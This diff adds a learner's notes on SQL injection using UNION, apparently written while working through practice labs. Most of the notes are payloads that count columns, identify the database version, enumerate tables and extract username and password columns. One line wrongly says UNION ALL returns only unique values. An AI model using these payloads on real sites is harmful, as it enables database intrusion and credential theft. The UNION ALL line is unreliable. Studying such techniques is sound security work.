@@ -1,0 +1,55 @@
+Union keyword lets you execute one or more select querys and append the results to original 
+
+select a,b from table1 union select c,d from table2;
+
+union all - just takes the unique values form the given tables
+
+the individual queries must reutrn the same number of columns
+the data types in each column must be compatible between the individual queries.
+
+find the number of columns used using
+
+'order by 1--  (increment it one by one till its error)
+
+or
+
+'union select 1--
+
+
+find the column that returns string
+
+=gifts'union select null,'yUgjGK',null--
+
+' union select username, password from users--
+
+examining the database:
+
+MSSQL, mysql - select @@version;
+Oracle	     - select * from v$version;
+PostgreSql   - select version();
+
+oracle banner info
+' union SELECT banner,null FROM v$version--
+
+mysql, mssql
+' union select @@version,null;-- -
+
+' UNION SELECT column_name, NULL FROM information_schema.columns where table_name='users_touxht'--
+
+' UNION SELECT username_rgjdiy,password_warnll FROM users_touxht--
+
+' union SELECT table_name,null FROM all_tables--
+
+' union SELECT column_name,null FROM all_tab_columns WHERE table_name = 'USER$'--
+
+' union SELECT column_name,null FROM all_tab_columns WHERE table_name = 'USERS_RBYXWM'--
+
+' union SELECT USERNAME_IFONFH,PASSWORD_SAIMCF FROM USERS_RBYXWM--
+
+'union SELECT null,CONCAT(username,'~',password) from users--
+
+
+
+
+
+
